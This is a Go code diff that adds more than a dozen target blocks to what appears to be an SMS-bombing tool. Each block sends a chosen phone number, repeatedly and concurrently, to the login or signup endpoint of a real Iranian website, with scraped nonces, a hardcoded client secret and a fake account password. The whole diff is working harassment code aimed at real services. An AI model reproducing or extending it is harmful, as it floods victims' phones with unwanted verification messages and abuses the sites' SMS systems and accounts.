@@ -483,6 +483,184 @@ cookieJar, _ := cookiejar.New(nil)
 	for i := 0; i < repeatCount; i++ {
                    //new:
 
+
+
+
+
+
+
+
+
+
+
+
+// --- evanhamrah.com  ✅ 
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        formData := url.Values{}
+        formData.Set("phone_number", phone)
+        formData.Set("action", "ajax_login_register")
+        formData.Set("wcp_nonce", "290a8a31b9")
+        sendFormRequest(c, ctx, "https://evanhamrah.com/wp-admin/admin-ajax.php", formData, &wg, ch)
+    }
+}(client)
+
+// --- ultraamooz.com  ✅ 
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        formData := url.Values{}
+        formData.Set("action", "digits_check_mob")
+        formData.Set("countrycode", "+98")
+        formData.Set("mobileNo", formatPhoneWithSpaces(phone))
+        formData.Set("csrf", "a6fd7f4d05") // ممکنه نیاز به آپدیت داشته باشه
+        formData.Set("login", "2")
+        formData.Set("username", "monsmain")
+        formData.Set("email", "")
+        formData.Set("captcha", "")
+        formData.Set("captcha_ses", "")
+        formData.Set("digits", "1")
+        formData.Set("json", "1")
+        formData.Set("whatsapp", "0")
+        formData.Set("digits_reg_name", "monsmain")
+        formData.Set("digits_reg_username", "monsmain")
+        formData.Set("digregcode", "+98")
+        formData.Set("digits_reg_mail", formatPhoneWithSpaces(phone))
+        formData.Set("digregscode2", "+98")
+        formData.Set("mobmail2", "")
+        formData.Set("digits_reg_password", "")
+        formData.Set("dig_otp", "")
+        formData.Set("code", "")
+        formData.Set("dig_reg_mail", "")
+        formData.Set("dig_nounce", "a6fd7f4d05")
+        sendFormRequest(c, ctx, "https://ultraamooz.com/wp-admin/admin-ajax.php", formData, &wg, ch)
+    }
+}(client)
+// --- tiwan site ✅ 
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        payload := map[string]interface{}{
+            "mobile": phone,
+            "client_id": "12",
+            "client_secret": "yKrlLyr4IBxXhZSyvjKZLObsUF8iSGNhtEEcjfIr",
+        }
+        sendJSONRequest(c, ctx, "https://user.zirbana.com/v2/register", payload, &wg, ch)
+    }
+}(client)
+
+//yeki az ina...
+// --- malltina.com ✅ 
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        payload := map[string]interface{}{
+            "username": phone,
+        }
+        sendJSONRequest(c, ctx, "https://api.malltina.com/check-user", payload, &wg, ch)
+    }
+}(client)
+
+// --- malltina.com/profiles ✅ 
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        payload := map[string]interface{}{
+            "password": "Monsmain1",
+            "mobile": phone,
+            "sign_up_referral_link": "https://www.google.com/",
+        }
+        sendJSONRequest(c, ctx, "https://api.malltina.com/profiles", payload, &wg, ch)
+    }
+}(client)
+
+// --- pateh.com  ✅ 
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        payload := map[string]interface{}{
+            "mobile": phone,
+        }
+        sendJSONRequest(c, ctx, "https://api.pateh.com/ath/auth/login-or-register", payload, &wg, ch)
+    }
+}(client)
+
+// --- aloghesti.com ✅ 
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        formData := url.Values{}
+        formData.Set("login_digt_countrycode", "+98")
+        formData.Set("digits_phone", getPhoneNumberNoZero(phone))
+        formData.Set("action_type", "phone")
+        formData.Set("digits_reg_name", "monsmain")
+        formData.Set("digits_process_register", "1")
+        formData.Set("sms_otp", "")
+        formData.Set("otp_step_1", "1")
+        formData.Set("digits_otp_field", "1")
+        formData.Set("digits", "1")
+        formData.Set("instance_id", "14a99a5919d973c4ac4f811d93cde732")
+        formData.Set("action", "digits_forms_ajax")
+        formData.Set("type", "login")
+        formData.Set("digits_step_1_type", "")
+        formData.Set("digits_step_1_value", "")
+        formData.Set("digits_step_2_type", "")
+        formData.Set("digits_step_2_value", "")
+        formData.Set("digits_step_3_type", "")
+        formData.Set("digits_step_3_value", "")
+        formData.Set("digits_login_email_token", "")
+        formData.Set("digits_redirect_page", "//aloghesti.com/?page=1&redirect_to=https%3A%2F%2Faloghesti.com%2F")
+        formData.Set("digits_form", "b3b7e8ee3b")
+        formData.Set("_wp_http_referer", "/?login=true&page=1&redirect_to=https%3A%2F%2Faloghesti.com%2F")
+        formData.Set("show_force_title", "1")
+        formData.Set("container", "digits_protected")
+        formData.Set("sub_action", "sms_otp")
+        sendFormRequest(c, ctx, "https://aloghesti.com/wp-admin/admin-ajax.php", formData, &wg, ch)
+    }
+}(client)
+// --- irani24.ir ✅ 
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        formData := url.Values{}
+        formData.Set("do", "")
+        formData.Set("user_mobile", phone)
+        formData.Set("confirm_code", "")
+        sendFormRequest(c, ctx, "https://irani24.ir/signin?do", formData, &wg, ch)
+    }
+}(client)
+// --- footballi.net ✅ 
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        payload := map[string]interface{}{
+            "login": phone,
+            "country_code": "+98",
+        }
+        sendJSONRequest(c, ctx, "https://api.footballi.net/api/v2/user/check", payload, &wg, ch)
+    }
+}(client)
+// --- arzplus.net ✅ 
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        payload := map[string]interface{}{
+            "phone": phone,
+        }
+        sendJSONRequest(c, ctx, "https://api.arzplus.net/api/v1/accounts/signup/init/", payload, &wg, ch)
+    }
+}(client)
+// --- dgshahr.com✅
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        payload := map[string]interface{}{
+            "phone_number": phone,
+        }
+        sendJSONRequest(c, ctx, "https://market-backend.dgshahr.com/shop/user/user_login/", payload, &wg, ch)
+    }
+}(client)
                // tala.ir ✅  
                wg.Add(1)
                tasks <- func(c *http.Client) func() {
